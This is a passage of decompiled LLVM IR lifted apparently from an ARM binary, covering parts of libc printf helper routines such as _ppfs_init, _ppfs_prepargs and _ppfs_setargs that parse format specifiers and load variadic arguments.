  store i32 %v3_112ac182, i32* %r3.global-to-local, align 4
  %v2_112b0183 = icmp eq i8 %v2_112ac181, 0
  br i1 %v2_112b0183, label %dec_label_pc_112c8, label %bb126

dec_label_pc_117fc:                               ; preds = %dec_label_pc_11308
  %v1_117fc = add i32 %v0_11310, 2
  store i32 %v1_117fc, i32* @r4, align 4
  br label %dec_label_pc_112ac.outer

dec_label_pc_11804:                               ; preds = %dec_label_pc_11674, %dec_label_pc_117d8, %.thread36, %dec_label_pc_11724, %dec_label_pc_11708, %dec_label_pc_115d8, %bb162, %dec_label_pc_1153c, %bb130, %dec_label_pc_117b4
  br label %dec_label_pc_1180c

dec_label_pc_1180c:                               ; preds = %dec_label_pc_112fc, %bb, %dec_label_pc_1127c, %dec_label_pc_11804
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_1127c ], [ -1, %dec_label_pc_11804 ], [ %stack_var_-336.2, %dec_label_pc_112fc ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_11238, i32* @r5, align 4
  store i32 %v15_11238, i32* @r8, align 4
  store i32 %v18_11238, i32* @sb, align 4
  store i32 %v21_11238, i32* @sl, align 4
  store i32 %v24_11238, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_117fc, { 1, 0 }
  uselistorder i8 %v2_112ac181, { 1, 2, 0 }
  uselistorder i32 %v0_112ac49, { 2, 0, 1 }
  uselistorder i32 %v5_112d8, { 2, 3, 1, 0 }
  uselistorder i32 %v0_113d8, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_117f4, { 1, 0, 2 }
  uselistorder i32 %v1_11788, { 2, 1, 0 }
  uselistorder i32 %v0_11790, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11710, { 1, 0 }
  uselistorder i32 %v2_116f4, { 2, 0, 1 }
  uselistorder i1 %v3_116d4, { 1, 0 }
  uselistorder i32 %v0_116e4, { 0, 2, 3, 1 }
  uselistorder i32 %v2_116b8, { 1, 0 }
  uselistorder i32 %v0_116fc, { 1, 0, 2 }
  uselistorder i32 %v3_1168c, { 1, 2, 0 }
  uselistorder i32 %v0_1163c, { 1, 0 }
  uselistorder i32 %v2_11620, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_115e8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_115b4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_114b8, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_114d4, { 1, 2, 3, 0 }
  uselistorder i32 %v6_11454, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_113b8, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_11368.pre, { 2, 1, 0 }
  uselistorder i32 %v1_11360, { 1, 0 }
  uselistorder i32 %v1_11308, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_112c8, { 1, 0 }
  uselistorder i32 %v1_112c0.lcssa, { 1, 0 }
  uselistorder i8 %v2_112ac, { 1, 2, 0 }
  uselistorder i32 %v2_112c0, { 1, 2, 3, 0 }
  uselistorder i1 %v7_114cc, { 1, 0 }
  uselistorder i1 %v7_11418, { 1, 2, 0 }
  uselistorder i1 %v7_11610, { 1, 0 }
  uselistorder i1 %v7_11570, { 1, 0 }
  uselistorder i1 %v7_1145c, { 1, 0 }
  uselistorder i32 %v2_115b0, { 0, 2, 1, 3 }
  uselistorder i32 %v2_11680, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_11390, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_11364, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_11344, { 1, 2, 0 }
  uselistorder i32 %v4_1133c, { 1, 0 }
  uselistorder i32 %v2_11240, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 5, 6, 3, 4, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 1, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r2.global-to-local, { 24, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 2, 22, 23, 25, 26, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 6, 5, 8, 7, 9, 10, 12, 11, 14, 13, 15, 16, 19, 17, 18, 21, 20, 24, 22, 26, 25, 28, 27, 31, 29, 44, 30, 45, 32, 33, 34, 35, 1, 23, 37, 36, 39, 38, 41, 40, 43, 42, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_1180c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_11804, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_117f4, { 1, 0 }
  uselistorder label %dec_label_pc_117b4, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_11724, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_116d0, { 1, 0 }
  uselistorder label %dec_label_pc_116b4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_116b4thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_116a8, { 1, 0 }
  uselistorder label %dec_label_pc_11698, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_1162c, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_11408, { 1, 0 }
  uselistorder label %dec_label_pc_11404, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1135c, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_112fc, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_112c8, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1182c = load i32, i32* @r4, align 4
  store i32 %v3_1182c, i32* %stack_var_-12, align 4
  %v6_1182c = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_11838 = load i32, i32* @r1, align 4
  store i32 %v0_11838, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_11840 = call i32 @__GI_memset()
  %v0_11844 = load i32, i32* @r4, align 4
  %v1_11844 = add i32 %v0_11844, 24
  %v2_11844 = inttoptr i32 %v1_11844 to i32*
  %v3_11844 = load i32, i32* %v2_11844, align 4
  %v1_11848 = add i32 %v3_11844, -1
  store i32 %v1_11848, i32* %v2_11844, align 4
  %v0_11850 = load i32, i32* @r5, align 4
  %v1_11850 = load i32, i32* @r4, align 4
  %v2_11850 = inttoptr i32 %v1_11850 to i32*
  store i32 %v0_11850, i32* %v2_11850, align 4
  %v0_11854 = load i32, i32* @r4, align 4
  %v1_11854 = add i32 %v0_11854, 40
  store i32 %v1_11854, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_1186419 = inttoptr i32 %v1_11854 to i32*
  store i32 8, i32* %v2_1186419, align 4
  %v3_1186420 = load i32, i32* %r1.global-to-local, align 4
  %v4_1186421 = add i32 %v3_1186420, 4
  store i32 %v4_1186421, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1185c.dec_label_pc_1185c_crit_edge

dec_label_pc_1185c.dec_label_pc_1185c_crit_edge:  ; preds = %entry, %dec_label_pc_1185c.dec_label_pc_1185c_crit_edge
  %v4_1186422 = phi i32 [ %v4_1186421, %entry ], [ %v4_11864, %dec_label_pc_1185c.dec_label_pc_1185c_crit_edge ]
  %v0_11860.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11860 = add i32 %v0_11860.pre, -1
  store i32 %v1_11860, i32* %r2.global-to-local, align 4
  %v7_11860 = icmp eq i32 %v0_11860.pre, 1
  %v2_11864 = inttoptr i32 %v4_1186422 to i32*
  store i32 8, i32* %v2_11864, align 4
  %v3_11864 = load i32, i32* %r1.global-to-local, align 4
  %v4_11864 = add i32 %v3_11864, 4
  store i32 %v4_11864, i32* %r1.global-to-local, align 4
  br i1 %v7_11860, label %dec_label_pc_1186c, label %dec_label_pc_1185c.dec_label_pc_1185c_crit_edge

dec_label_pc_1186c:                               ; preds = %dec_label_pc_1185c.dec_label_pc_1185c_crit_edge
  %v0_1186c = load i32, i32* @r5, align 4
  store i32 %v0_1186c, i32* %r2.global-to-local, align 4
  %v1_118b03 = inttoptr i32 %v0_1186c to i8*
  %v2_118b04 = load i8, i8* %v1_118b03, align 1
  %v2_118b46 = icmp eq i8 %v2_118b04, 0
  br i1 %v2_118b46, label %dec_label_pc_118bc, label %dec_label_pc_1187c

dec_label_pc_11874:                               ; preds = %dec_label_pc_11894
  %v2_11878 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11878, i32* @r4, align 4
  store i32 %v6_1182c, i32* @r5, align 4
  ret i32 -1

dec_label_pc_1187c:                               ; preds = %dec_label_pc_1186c, %dec_label_pc_118b0.backedge
  %v0_11884 = phi i32 [ %storemerge, %dec_label_pc_118b0.backedge ], [ %v0_1186c, %dec_label_pc_1186c ]
  %v2_118b07 = phi i8 [ %v2_118b0, %dec_label_pc_118b0.backedge ], [ %v2_118b04, %dec_label_pc_1186c ]
  %v7_1187c = icmp eq i8 %v2_118b07, 37
  br i1 %v7_1187c, label %dec_label_pc_11884, label %dec_label_pc_118ac

dec_label_pc_11884:                               ; preds = %dec_label_pc_1187c
  %v1_11884 = add i32 %v0_11884, 1
  %v2_11884 = inttoptr i32 %v1_11884 to i8*
  %v3_11884 = load i8, i8* %v2_11884, align 1
  store i32 %v1_11884, i32* %r2.global-to-local, align 4
  %v7_11888 = icmp eq i8 %v3_11884, 37
  br i1 %v7_11888, label %dec_label_pc_118ac, label %dec_label_pc_11894

dec_label_pc_11894:                               ; preds = %dec_label_pc_11884
  %v0_1188c = load i32, i32* @r4, align 4
  %v2_11894 = inttoptr i32 %v0_1188c to i32*
  store i32 %v1_11884, i32* %v2_11894, align 4
  %v2_11898 = call i32 @_ppfs_parsespec(i32* %v2_11894)
  %v1_1189c = icmp slt i32 %v2_11898, 0
  br i1 %v1_1189c, label %dec_label_pc_11874, label %dec_label_pc_118a4

dec_label_pc_118a4:                               ; preds = %dec_label_pc_11894
  %v0_118a4 = load i32, i32* @r4, align 4
  %v1_118a4 = inttoptr i32 %v0_118a4 to i32*
  %v2_118a4 = load i32, i32* %v1_118a4, align 4
  br label %dec_label_pc_118b0.backedge

dec_label_pc_118ac:                               ; preds = %dec_label_pc_1187c, %dec_label_pc_11884
  %v0_118ac = phi i32 [ %v0_11884, %dec_label_pc_1187c ], [ %v1_11884, %dec_label_pc_11884 ]
  %v1_118ac = add i32 %v0_118ac, 1
  br label %dec_label_pc_118b0.backedge

dec_label_pc_118b0.backedge:                      ; preds = %dec_label_pc_118ac, %dec_label_pc_118a4
  %storemerge = phi i32 [ %v1_118ac, %dec_label_pc_118ac ], [ %v2_118a4, %dec_label_pc_118a4 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_118b0 = inttoptr i32 %storemerge to i8*
  %v2_118b0 = load i8, i8* %v1_118b0, align 1
  %v2_118b4 = icmp eq i8 %v2_118b0, 0
  br i1 %v2_118b4, label %dec_label_pc_118b0.dec_label_pc_118bc_crit_edge, label %dec_label_pc_1187c

dec_label_pc_118b0.dec_label_pc_118bc_crit_edge:  ; preds = %dec_label_pc_118b0.backedge
  %v0_118bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_118bc

dec_label_pc_118bc:                               ; preds = %dec_label_pc_118b0.dec_label_pc_118bc_crit_edge, %dec_label_pc_1186c
  %v0_118bc = phi i32 [ %v0_118bc.pre, %dec_label_pc_118b0.dec_label_pc_118bc_crit_edge ], [ %v0_1186c, %dec_label_pc_1186c ]
  %v3_118b0.lcssa.in = phi i8 [ %v2_118b0, %dec_label_pc_118b0.dec_label_pc_118bc_crit_edge ], [ %v2_118b04, %dec_label_pc_1186c ]
  %v3_118b0.lcssa = zext i8 %v3_118b0.lcssa.in to i32
  %v1_118bc = load i32, i32* @r4, align 4
  %v2_118bc = inttoptr i32 %v1_118bc to i32*
  store i32 %v0_118bc, i32* %v2_118bc, align 4
  %v2_118c0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_118c0, i32* @r4, align 4
  store i32 %v6_1182c, i32* @r5, align 4
  ret i32 %v3_118b0.lcssa

; uselistorder directives
  uselistorder i8 %v2_118b0, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1186c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11864, { 1, 0 }
  uselistorder i32 %v0_11860.pre, { 1, 0 }
  uselistorder i32 %v6_1182c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 5, 4, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_118ac, { 1, 0 }
  uselistorder label %dec_label_pc_1187c, { 1, 0 }
  uselistorder label %dec_label_pc_1185c.dec_label_pc_1185c_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_118c4 = load i32, i32* @r4, align 4
  store i32 %v3_118c4, i32* %stack_var_-12, align 4
  %v1_118c8 = add i32 %arg1, 24
  %v2_118c8 = inttoptr i32 %v1_118c8 to i32*
  %v3_118c8 = load i32, i32* %v2_118c8, align 4
  store i32 %v3_118c8, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_118d8 = add i32 %arg1, 76
  %v3_118d8 = inttoptr i32 %v2_118d8 to i32*
  store i32 %arg2, i32* %v3_118d8, align 4
  %v7_118dc = icmp sgt i32 %v3_118c8, 0
  br i1 %v7_118dc, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_118dc = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_118dc, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_118e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_118e0 = add i32 %arg1, 8
  %v3_118e0 = inttoptr i32 %v2_118e0 to i32*
  store i32 %v0_118e0, i32* %v3_118e0, align 4
  %v0_118e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_118e4 = add i32 %arg1, 28
  %v3_118e4 = inttoptr i32 %v2_118e4 to i32*
  store i32 %v0_118e4, i32* %v3_118e4, align 4
  %v0_118e8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_118e8, i32* %v2_118c8, align 4
  %v0_118ec = load i32, i32* %r3.global-to-local, align 4
  %v2_118ec = add i32 %arg1, 4
  %v3_118ec = inttoptr i32 %v2_118ec to i32*
  store i32 %v0_118ec, i32* %v3_118ec, align 4
  %v0_118f0 = call i32 @_ppfs_setargs()
  %v0_118f4 = load i32, i32* %r5.global-to-local, align 4
  %v1_118f4 = load i32, i32* @r4, align 4
  %v2_118f4 = add i32 %v1_118f4, 24
  %v3_118f4 = inttoptr i32 %v2_118f4 to i32*
  store i32 %v0_118f4, i32* %v3_118f4, align 4
  %v2_118f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_118f8, i32* @r4, align 4
  ret i32 %v0_118f0

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 6, 4, 5, 2, 1, 3, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_118fc = load i32, i32* @r0, align 4
  %v1_118fc = add i32 %v0_118fc, 24
  %v2_118fc = inttoptr i32 %v1_118fc to i32*
  %v3_118fc = load i32, i32* %v2_118fc, align 4
  store i32 %v3_118fc, i32* %r1.global-to-local, align 4
  %v2_11900 = icmp eq i32 %v3_118fc, 0
  %v3_11904 = load i32, i32* @r4, align 4
  store i32 %v3_11904, i32* %stack_var_-8, align 4
  %v1_11908 = add i32 %v0_118fc, 80
  store i32 %v1_11908, i32* %ip.global-to-local, align 4
  %v1_1190c = add i32 %v0_118fc, 8
  %v2_1190c = inttoptr i32 %v1_1190c to i32*
  %v3_1190c = load i32, i32* %v2_1190c, align 4
  store i32 %v3_1190c, i32* %r3.global-to-local, align 4
  %v6_11914 = icmp eq i32 %v3_1190c, -2147483648
  br i1 %v2_11900, label %dec_label_pc_11914, label %dec_label_pc_11a38

dec_label_pc_11914:                               ; preds = %entry
  br i1 %v6_11914, label %dec_label_pc_1191c, label %dec_label_pc_11934

dec_label_pc_1191c:                               ; preds = %dec_label_pc_11914
  %v1_1191c = add i32 %v0_118fc, 76
  %v2_1191c = inttoptr i32 %v1_1191c to i32*
  %v3_1191c = load i32, i32* %v2_1191c, align 4
  store i32 %v3_1191c, i32* %r3.global-to-local, align 4
  %v1_11920 = inttoptr i32 %v3_1191c to i32*
  %v2_11920 = load i32, i32* %v1_11920, align 4
  store i32 %v2_11920, i32* %r2.global-to-local, align 4
  %v1_11924 = add i32 %v3_1191c, 4
  store i32 %v1_11924, i32* %r3.global-to-local, align 4
  store i32 %v1_11924, i32* %v2_1191c, align 4
  %v0_1192c = load i32, i32* %r2.global-to-local, align 4
  %v1_1192c = load i32, i32* @r0, align 4
  %v2_1192c = add i32 %v1_1192c, 8
  %v3_1192c = inttoptr i32 %v2_1192c to i32*
  store i32 %v0_1192c, i32* %v3_1192c, align 4
  %v0_11930 = load i32, i32* %r2.global-to-local, align 4
  %v1_11930 = load i32, i32* @r0, align 4
  %v2_11930 = add i32 %v1_11930, 80
  %v3_11930 = inttoptr i32 %v2_11930 to i32*
  store i32 %v0_11930, i32* %v3_11930, align 4
  %v0_11934.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11934

dec_label_pc_11934:                               ; preds = %dec_label_pc_11914, %dec_label_pc_1191c
  %v1_1194c = phi i32 [ %v0_118fc, %dec_label_pc_11914 ], [ %v0_11934.pre, %dec_label_pc_1191c ]
  %v1_11934 = add i32 %v1_1194c, 4
  %v2_11934 = inttoptr i32 %v1_11934 to i32*
  %v3_11934 = load i32, i32* %v2_11934, align 4
  store i32 %v3_11934, i32* %r3.global-to-local, align 4
  %v6_11938 = icmp eq i32 %v3_11934, -2147483648
  br i1 %v6_11938, label %dec_label_pc_11940, label %dec_label_pc_11958

dec_label_pc_11940:                               ; preds = %dec_label_pc_11934
  %v1_11940 = add i32 %v1_1194c, 76
  %v2_11940 = inttoptr i32 %v1_11940 to i32*
  %v3_11940 = load i32, i32* %v2_11940, align 4
  store i32 %v3_11940, i32* %r3.global-to-local, align 4
  %v1_11944 = inttoptr i32 %v3_11940 to i32*
  %v2_11944 = load i32, i32* %v1_11944, align 4
  store i32 %v2_11944, i32* %r2.global-to-local, align 4
  %v1_11948 = add i32 %v3_11940, 4
  store i32 %v1_11948, i32* %r3.global-to-local, align 4
  store i32 %v1_11948, i32* %v2_11940, align 4
  %v0_11950 = load i32, i32* %r2.global-to-local, align 4
  %v1_11950 = load i32, i32* @r0, align 4
  %v2_11950 = add i32 %v1_11950, 4
  %v3_11950 = inttoptr i32 %v2_11950 to i32*
  store i32 %v0_11950, i32* %v3_11950, align 4
  %v0_11954 = load i32, i32* %r2.global-to-local, align 4
  %v1_11954 = load i32, i32* @r0, align 4
  %v2_11954 = add i32 %v1_11954, 80
  %v3_11954 = inttoptr i32 %v2_11954 to i32*
  store i32 %v0_11954, i32* %v3_11954, align 4
  %v0_11a2818.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11958

dec_label_pc_11958:                               ; preds = %dec_label_pc_11934, %dec_label_pc_11940
  %v0_11a2818 = phi i32 [ %v1_1194c, %dec_label_pc_11934 ], [ %v0_11a2818.pre, %dec_label_pc_11940 ]
  %v0_11958 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11958, i32* %lr.global-to-local, align 4
  %v1_11a2819 = add i32 %v0_11a2818, 28
  %v2_11a2820 = inttoptr i32 %v1_11a2819 to i32*
  %v3_11a2821 = load i32, i32* %v2_11a2820, align 4
  store i32 %v3_11a2821, i32* %r3.global-to-local, align 4
  %v5_11a3023 = icmp slt i32 %v0_11958, %v3_11a2821
  br i1 %v5_11a3023, label %dec_label_pc_11960, label %dec_label_pc_11a34.loopexit

dec_label_pc_11960:                               ; preds = %dec_label_pc_11958, %dec_label_pc_11a24
  %v0_11a2825 = phi i32 [ %v0_11a28, %dec_label_pc_11a24 ], [ %v0_11a2818, %dec_label_pc_11958 ]
  %v1_1196024 = phi i32 [ %v1_11a24, %dec_label_pc_11a24 ], [ %v0_11958, %dec_label_pc_11958 ]
  %v4_11960 = mul i32 %v1_1196024, 4
  %v5_11960 = add i32 %v0_11a2825, %v4_11960
  store i32 %v5_11960, i32* %r3.global-to-local, align 4
  %v1_11964 = add i32 %v5_11960, 40
  %v2_11964 = inttoptr i32 %v1_11964 to i32*
  %v3_11964 = load i32, i32* %v2_11964, align 4
  store i32 %v3_11964, i32* %r2.global-to-local, align 4
  %v7_11968 = icmp eq i32 %v3_11964, 8
  br i1 %v7_11968, label %dec_label_pc_11a24, label %dec_label_pc_11970

dec_label_pc_11970:                               ; preds = %dec_label_pc_11960
  %v1_11970 = add i32 %v0_11a2825, 76
  %v2_11970 = inttoptr i32 %v1_11970 to i32*
  %v3_11970 = load i32, i32* %v2_11970, align 4
  store i32 %v3_11970, i32* %r1.global-to-local, align 4
  %v8_11974 = icmp sgt i32 %v3_11964, 8
  br i1 %v8_11974, label %dec_label_pc_11998, label %dec_label_pc_11978

dec_label_pc_11978:                               ; preds = %dec_label_pc_11970
  %v7_11978 = icmp eq i32 %v3_11964, 2
  br i1 %v7_11978, label %dec_label_pc_119e4, label %dec_label_pc_11980

dec_label_pc_11980:                               ; preds = %dec_label_pc_11978
  %v8_11980 = icmp sgt i32 %v3_11964, 2
  br i1 %v8_11980, label %dec_label_pc_11990, label %dec_label_pc_11984

dec_label_pc_11984:                               ; preds = %dec_label_pc_11980
  %v1_11984 = icmp slt i32 %v3_11964, 0
  br i1 %v1_11984, label %dec_label_pc_11a10, label %dec_label_pc_119e4

dec_label_pc_11990:                               ; preds = %dec_label_pc_11980
  %v7_11990 = icmp eq i32 %v3_11964, 7
  br i1 %v7_11990, label %dec_label_pc_119f8, label %dec_label_pc_11a10

dec_label_pc_11998:                               ; preds = %dec_label_pc_11970
  %v7_11998 = icmp eq i32 %v3_11964, 1024
  br i1 %v7_11998, label %dec_label_pc_119e4, label %dec_label_pc_119a0

dec_label_pc_119a0:                               ; preds = %dec_label_pc_11998
  %v8_119a0 = icmp sgt i32 %v3_11964, 1024
  br i1 %v8_119a0, label %dec_label_pc_119b8, label %dec_label_pc_119a4

dec_label_pc_119a4:                               ; preds = %dec_label_pc_119a0
  switch i32 %v3_11964, label %dec_label_pc_11a10 [
    i32 256, label %dec_label_pc_119e4
    i32 512, label %dec_label_pc_119e4
  ]

dec_label_pc_119b8:                               ; preds = %dec_label_pc_119a0
  %v7_119b8 = icmp eq i32 %v3_11964, 2048
  br i1 %v7_119b8, label %dec_label_pc_119d0, label %dec_label_pc_119c8

dec_label_pc_119c8:                               ; preds = %dec_label_pc_119b8
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_119c4 = icmp eq i32 %v3_11964, 2055
  br i1 %v9_119c4, label %dec_label_pc_119f8, label %dec_label_pc_11a10

dec_label_pc_119d0:                               ; preds = %dec_label_pc_119b8
  %v1_119d0 = add i32 %v3_11970, 8
  store i32 %v1_119d0, i32* %r3.global-to-local, align 4
  store i32 %v1_119d0, i32* %v2_11970, align 4
  %v0_119d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_119d8 = inttoptr i32 %v0_119d8 to i32*
  %v2_119d8 = load i32, i32* %v1_119d8, align 4
  store i32 %v2_119d8, i32* %r3.global-to-local, align 4
  %v3_119d8 = add i32 %v0_119d8, 4
  %v4_119d8 = inttoptr i32 %v3_119d8 to i32*
  %v5_119d8 = load i32, i32* %v4_119d8, align 4
  store i32 %v5_119d8, i32* %r4.global-to-local, align 4
  %v0_119dc = load i32, i32* %ip.global-to-local, align 4
  %v1_119dc = inttoptr i32 %v0_119dc to i32*
  store i32 %v2_119d8, i32* %v1_119dc, align 4
  %v3_119dc = add i32 %v0_119dc, 4
  %v4_119dc = inttoptr i32 %v3_119dc to i32*
  %v5_119dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_119dc, i32* %v4_119dc, align 4
  br label %dec_label_pc_11a20

dec_label_pc_119e4:                               ; preds = %dec_label_pc_119a4, %dec_label_pc_119a4, %dec_label_pc_11984, %dec_label_pc_11998, %dec_label_pc_11978
  %v1_119e4 = inttoptr i32 %v3_11970 to i32*
  %v2_119e4 = load i32, i32* %v1_119e4, align 4
  store i32 %v2_119e4, i32* %r2.global-to-local, align 4
  %v1_119e8 = add i32 %v3_11970, 4
  store i32 %v1_119e8, i32* %r3.global-to-local, align 4
  store i32 %v1_119e8, i32* %v2_11970, align 4
  %v0_119f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_119f0 = load i32, i32* %ip.global-to-local, align 4
  %v2_119f0 = inttoptr i32 %v1_119f0 to i32*
  store i32 %v0_119f0, i32* %v2_119f0, align 4
  br label %dec_label_pc_11a20

dec_label_pc_119f8:                               ; preds = %dec_label_pc_11990, %dec_label_pc_119c8
  %v3_119f8 = load i32, i32* %v2_11970, align 4
  store i32 %v3_119f8, i32* %r2.global-to-local, align 4
  %v1_119fc = add i32 %v3_119f8, 8
  store i32 %v1_119fc, i32* %r3.global-to-local, align 4
  store i32 %v1_119fc, i32* %v2_11970, align 4
  %v0_11a04 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a04 = inttoptr i32 %v0_11a04 to i32*
  %v2_11a04 = load i32, i32* %v1_11a04, align 4
  store i32 %v2_11a04, i32* %r3.global-to-local, align 4
  %v3_11a04 = add i32 %v0_11a04, 4
  %v4_11a04 = inttoptr i32 %v3_11a04 to i32*
  %v5_11a04 = load i32, i32* %v4_11a04, align 4
  store i32 %v5_11a04, i32* %r4.global-to-local, align 4
  %v0_11a08 = load i32, i32* %ip.global-to-local, align 4
  %v1_11a08 = inttoptr i32 %v0_11a08 to i32*
  store i32 %v2_11a04, i32* %v1_11a08, align 4
  %v3_11a08 = add i32 %v0_11a08, 4
  %v4_11a08 = inttoptr i32 %v3_11a08 to i32*
  %v5_11a08 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_11a08, i32* %v4_11a08, align 4
  br label %dec_label_pc_11a20

dec_label_pc_11a10:                               ; preds = %dec_label_pc_119a4, %dec_label_pc_11990, %dec_label_pc_11984, %dec_label_pc_119c8
  %v1_11a10 = add i32 %v3_11970, 4
  store i32 %v1_11a10, i32* %r3.global-to-local, align 4
  store i32 %v1_11a10, i32* %v2_11970, align 4
  %v0_11a18 = load i32, i32* %r1.global-to-local, align 4
  %v1_11a18 = inttoptr i32 %v0_11a18 to i32*
  %v2_11a18 = load i32, i32* %v1_11a18, align 4
  store i32 %v2_11a18, i32* %r3.global-to-local, align 4
  %v1_11a1c = load i32, i32* %ip.global-to-local, align 4
  %v2_11a1c = inttoptr i32 %v1_11a1c to i32*
  store i32 %v2_11a18, i32* %v2_11a1c, align 4
  br label %dec_label_pc_11a20

dec_label_pc_11a20:                               ; preds = %dec_label_pc_119f8, %dec_label_pc_119e4, %dec_label_pc_119d0, %dec_label_pc_11a10
  %v0_11a20 = load i32, i32* %ip.global-to-local, align 4
